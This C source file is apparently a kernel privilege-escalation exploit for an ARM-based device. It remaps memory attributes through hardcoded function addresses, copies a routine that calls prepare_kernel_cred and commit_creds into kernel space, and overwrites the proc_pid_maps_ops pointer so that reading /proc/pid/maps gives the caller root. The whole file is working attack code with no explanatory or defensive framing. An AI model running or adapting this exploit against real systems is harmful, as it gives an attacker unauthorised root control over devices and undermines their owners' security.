#define PAGE_OFFSET 0xc0000000
#define PHYS_OFFSET 0x08000000
#define V2P(X) (X - PAGE_OFFSET + PHYS_OFFSET)

void root() {
    void* (*prepare_kernel_cred)(void *hoge) = (void*)0xc0046ae0;
    void (*commit_creds)(void *cred) = (void*)0xc00465c0;
    commit_creds(prepare_kernel_cred(NULL));
}
asm("root_end:");
extern char root_end[];

#define shellcode_v 0xc04f2000

int main() {
    void *shellcode_p = (void*)V2P(shellcode_v);
    void (*_memcpy)(void *dst,const void *src, size_t len) = (void *)0x1000;
    void (*flush)() = (void*)0x12B08;
    unsigned* proc_pid_maps_ops = (void*)(V2P(0xc0390f9c + 8));
    void (*SetTlbAttributes)(unsigned addr, unsigned attrib) = (void*)0x00012C3C;
    //0x10c06
    SetTlbAttributes((unsigned)(proc_pid_maps_ops) & ~0xfffff, 0x15de6);
    SetTlbAttributes((unsigned)(shellcode_p) & ~0xfffff, 0x15de6);

    _memcpy(shellcode_p, root, (unsigned)&root_end - (unsigned)root);
    *proc_pid_maps_ops = shellcode_v;
    flush();

    for(;;);
}
